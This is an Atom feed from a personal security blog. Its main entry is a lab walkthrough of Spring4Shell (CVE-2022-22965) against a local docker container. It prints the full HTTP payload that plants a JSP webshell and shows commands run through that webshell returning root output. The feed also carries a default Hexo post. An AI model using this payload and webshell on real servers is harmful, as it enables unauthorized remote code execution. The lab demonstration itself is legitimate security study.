<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mdn1nj4&#39;s Blog</title>
  
  
  <link href="https://mdn1nj4.github.io/blog/atom.xml" rel="self"/>
  
  <link href="https://mdn1nj4.github.io/blog/"/>
  <updated>2022-04-10T03:31:08.764Z</updated>
  <id>https://mdn1nj4.github.io/blog/</id>
  
  <author>
    <name>mdn1nj4</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2022-22965 - Build and Exploit</title>
    <link href="https://mdn1nj4.github.io/blog/CVE/cve-2022-22965-build-and-attack/"/>
    <id>https://mdn1nj4.github.io/blog/CVE/cve-2022-22965-build-and-attack/</id>
    <published>2022-04-06T18:30:00.000Z</published>
    <updated>2022-04-10T03:31:08.764Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="CVE-2022-22965"><a href="#CVE-2022-22965" class="headerlink" title="CVE-2022-22965"></a>CVE-2022-22965</h2><p>A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.<br>Read more: <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965" title="link">https://nvd.nist.gov/vuln/detail/CVE-2022-22965</a></p><h2 id="Build-the-application"><a href="#Build-the-application" class="headerlink" title="Build the application"></a>Build the application</h2><p>This docker image contains a Spring Boot web application which is vulnerable to CVE-2022-22965.</p><p>A vulnerable configuration consists of:<br>JDK version 9+<br>Apache Tomcat for serving the application<br>Spring Framework versions 5.3.0 to 5.3.17 and 5.2.0 to 5.2.19 and below<br>application built as a WAR file</p><p>Pull the docker image</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker pull vulfocus/spring-core-rce-2022-03-29<br></code></pre></td></tr></table></figure><p>Then run the below command to deploy the web app</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ docker run --rm --name spring_rce -p 8080:8080 vulfocus/spring-core-rce-2022-03-29<br></code></pre></td></tr></table></figure><p>curl the localhost:8080 to confirm the application is running or not.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://localhost:8080 -v <br>*   Trying 127.0.0.1:8080...<br>* TCP_NODELAY <span class="hljs-built_in">set</span><br>* Connected to localhost (127.0.0.1) port 8080 (<span class="hljs-comment">#0)</span><br>&gt; GET / HTTP/1.1<br>&gt; Host: localhost:8080<br>&gt; User-Agent: curl/7.68.0<br>&gt; Accept: */*<br>&gt; <br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 200 <br>&lt; Content-Type: text/plain;charset=UTF-8<br>&lt; Content-Length: 2<br>&lt; Date: Thu, 07 Apr 2022 12:01:10 GMT<br>&lt; <br>* Connection <span class="hljs-comment">#0 to host localhost left intact</span><br>ok<br></code></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Download the exploit script from github. i’m using this : <a href="https://github.com/BobTheShoplifter/Spring4Shell-POC" title="https://github.com/BobTheShoplifter/Spring4Shell-POC">https://github.com/BobTheShoplifter/Spring4Shell-POC</a></p><p>But there is lots of exploit script available for this vulnerability in github.</p><p>Here is the payload used in this python script</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        headers = &#123;<br>            <span class="hljs-string">&quot;suffix&quot;</span>: <span class="hljs-string">&quot;%&gt;//&quot;</span>,<br>            <span class="hljs-string">&quot;c1&quot;</span>: <span class="hljs-string">&quot;Runtime&quot;</span>,<br>            <span class="hljs-string">&quot;c2&quot;</span>: <span class="hljs-string">&quot;&lt;%&quot;</span>,<br>            <span class="hljs-string">&quot;DNT&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>            <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        &#125;<br><br>        data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span><br><br>        <span class="hljs-keyword">try</span>:<br>            requests.post(self.url,<br>                          headers=headers,<br>                          data=data,<br>                          timeout=<span class="hljs-number">15</span>,<br>                          allow_redirects=<span class="hljs-literal">False</span>,<br>                          verify=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>run this command to inject the webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"> $ git <span class="hljs-built_in">clone</span> https://github.com/BobTheShoplifter/Spring4Shell-POC.git<br>Cloning into <span class="hljs-string">&#x27;Spring4Shell-POC&#x27;</span>...<br>remote: Enumerating objects: 297, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (297/297), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (245/245), <span class="hljs-keyword">done</span>.<br>remote: Total 297 (delta 100), reused 109 (delta 27), pack-reused 0<br>Receiving objects: 100% (297/297), 16.45 MiB | 7.90 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (100/100), <span class="hljs-keyword">done</span>.<br>$ <span class="hljs-built_in">cd</span> Spring4Shell-POC/<br>$ <span class="hljs-built_in">chmod</span> +x poc.py <br>$ ./poc.py  --url http://localhost:8080/<br>Vulnerable，shell url: http://localhost:8080/tomcatwar.jsp?<span class="hljs-built_in">pwd</span>=j&amp;cmd=<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>the script successfully injected the webshell in the server.</p><p>just curl the url : <strong><a href="http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id">http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id</a></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl <span class="hljs-string">&#x27;http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id&#x27;</span> --output -<br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><br>//<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br>- <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;j&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="hljs-keyword">in</span> = -.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="hljs-keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -<br></code></pre></td></tr></table></figure><p>Reference: <a href="https://github.com/itsecurityco/CVE-2022-22965" title="https://github.com/itsecurityco/CVE-2022-22965">https://github.com/itsecurityco/CVE-2022-22965</a></p>]]></content>
    
    
    <summary type="html">A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.</summary>
    
    
    
    <category term="CVE" scheme="https://mdn1nj4.github.io/blog/categories/CVE/"/>
    
    
    <category term="spring-core" scheme="https://mdn1nj4.github.io/blog/tags/spring-core/"/>
    
    <category term="java" scheme="https://mdn1nj4.github.io/blog/tags/java/"/>
    
    <category term="CVE-2022-22965" scheme="https://mdn1nj4.github.io/blog/tags/CVE-2022-22965/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://mdn1nj4.github.io/blog/hello-world/"/>
    <id>https://mdn1nj4.github.io/blog/hello-world/</id>
    <published>2016-03-30T21:12:21.000Z</published>
    <updated>2022-04-10T06:56:20.246Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a><a href="" title="Download File">Download File</a><br><img src="/blog/uploads/avatar.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@requires_authorization(<span class="hljs-params">roles=[<span class="hljs-string">&quot;ADMIN&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">somefunc</span>(<span class="hljs-params">param1=<span class="hljs-string">&#x27;&#x27;</span>, param2=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-string">r&#x27;&#x27;&#x27;A docstring&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> param1 &gt; param2: <span class="hljs-comment"># interesting</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Gre\&#x27;ater&#x27;</span><br>    <span class="hljs-keyword">return</span> (param2 - param1 + <span class="hljs-number">1</span> + <span class="hljs-number">0b10l</span>) <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeClass</span>:<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>message = <span class="hljs-string">&#x27;&#x27;&#x27;interpreter</span><br><span class="hljs-string"><span class="hljs-meta">... </span>prompt&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.</summary>
    
    
    
    
  </entry>
  
</feed>
